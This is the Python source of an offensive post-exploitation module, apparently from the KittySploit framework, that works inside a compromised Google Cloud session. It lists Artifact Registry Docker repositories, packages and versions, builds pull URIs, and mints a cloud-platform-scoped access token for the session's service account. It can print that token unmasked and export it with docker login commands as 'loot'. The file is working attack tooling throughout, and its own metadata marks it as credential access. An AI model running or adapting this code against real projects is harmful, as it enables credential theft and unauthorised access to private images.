#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Artifact Registry Pull Tokens Loot",
        "description": "Build Docker pull URIs and registry login material for Artifact Registry images",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "artifact-registry", "docker", "credentials", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 15,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    max_repos = OptInteger(10, "Maximum Docker repositories to process", False)
    max_packages = OptInteger(20, "Maximum packages per repository", False)
    max_versions = OptInteger(5, "Maximum versions per package", False)
    mint_access_token = OptBool(True, "Mint a short-lived access token for docker login when principal is a service account", False)
    mask_token = OptBool(True, "Mask access token in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    DOCKER_SCOPE = "https://www.googleapis.com/auth/cloud-platform"

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            repos = [repo for repo in self._list_repositories() if str(repo.get("format") or "").upper() == "DOCKER"]
            if not repos:
                print_warning("No Docker Artifact Registry repositories found")
                return self.module_result(success=True, data={"repositories": []})

            max_repos = max(1, int(self.max_repos or 10))
            max_packages = max(1, int(self.max_packages or 20))
            max_versions = max(1, int(self.max_versions or 5))
            loot = []
            login_hosts = set()

            print_info(f"Building pull references for {min(len(repos), max_repos)} Docker repository(ies)...")
            for repo in repos[:max_repos]:
                repo_name = str(repo.get("name") or "")
                short_repo = repo_name.rsplit("/", 1)[-1]
                location = self._location_from_resource(repo_name)
                host = self._gcp_artifact_registry_host(location)
                if host:
                    login_hosts.add(host)

                repo_entry = {
                    "name": short_repo,
                    "full_name": repo_name,
                    "location": location,
                    "registry_host": host,
                    "packages": [],
                }

                for package in self._list_packages(repo_name, max_packages):
                    package_name = str(package.get("name") or "")
                    package_short = package_name.rsplit("/", 1)[-1]
                    versions = self._list_versions(package_name, max_versions)
                    pulls = []
                    for version in versions:
                        version_id = str(version.get("name") or "").rsplit("/", 1)[-1]
                        tags = list(version.get("tags") or [])
                        tag = tags[0] if tags else version_id
                        pull_uri = self._gcp_artifact_registry_pull_uri(
                            location, project_id, short_repo, package_short, tag
                        )
                        pulls.append(
                            {
                                "version": version_id,
                                "tags": tags,
                                "pull_uri": pull_uri,
                                "docker_pull": f"docker pull {pull_uri}" if pull_uri else "",
                            }
                        )
                    repo_entry["packages"].append(
                        {"name": package_short, "full_name": package_name, "pulls": pulls}
                    )
                    if pulls:
                        print_success(f"  {short_repo}/{package_short}: {len(pulls)} pull ref(s)")

                loot.append(repo_entry)
                print_info("-" * 80)

            auth = self._build_docker_auth(project_id, sorted(login_hosts))
            payload = {
                "project_id": project_id,
                "repositories": loot,
                "docker_auth": auth,
            }
            if auth.get("accessToken"):
                displayed = self._gcp_mask_token(auth["accessToken"]) if self.mask_token else auth["accessToken"]
                print_success("Short-lived access token minted for docker login")
                print_info(f"Token: {displayed}")
            for host in sorted(login_hosts):
                print_info(f"docker login -u oauth2accesstoken --password-stdin https://{host}")

            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} repository(ies)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Artifact Registry pull token loot failed: {exc}")
            return False

    def _list_repositories(self):
        return list(self._gcp_body_dict("artifact_repos").get("repositories") or [])

    def _list_packages(self, repository_name, max_packages):
        url = f"https://artifactregistry.googleapis.com/v1/{repository_name}/packages"
        return self._gcp_paginate_get(
            url, "packages", max_items=max_packages, params={"pageSize": min(max_packages, 100)}
        )

    def _list_versions(self, package_name, max_versions):
        url = f"https://artifactregistry.googleapis.com/v1/{package_name}/versions"
        return self._gcp_paginate_get(
            url, "versions", max_items=max_versions, params={"pageSize": min(max_versions, 100)}
        )

    @staticmethod
    def _location_from_resource(resource_name):
        parts = str(resource_name or "").split("/")
        try:
            index = parts.index("locations")
            return parts[index + 1]
        except (ValueError, IndexError):
            return ""

    def _build_docker_auth(self, project_id, hosts):
        auth = {
            "username": "oauth2accesstoken",
            "registry_hosts": hosts,
            "login_commands": [
                f"echo \"$TOKEN\" | docker login -u oauth2accesstoken --password-stdin https://{host}"
                for host in hosts
            ],
        }
        if not self.mint_access_token:
            return auth

        principal = self._gcp_client_email()
        if not principal or not principal.endswith(".gserviceaccount.com"):
            auth["token_error"] = "Access token minting requires a service account principal"
            return auth

        token_result = self._gcp_generate_access_token(
            principal,
            scopes=[self.DOCKER_SCOPE],
            lifetime="3600s",
        )
        if token_result.get("success"):
            auth["accessToken"] = token_result.get("accessToken")
            auth["expireTime"] = token_result.get("expireTime")
        else:
            auth["token_error"] = token_result.get("error")
        return auth
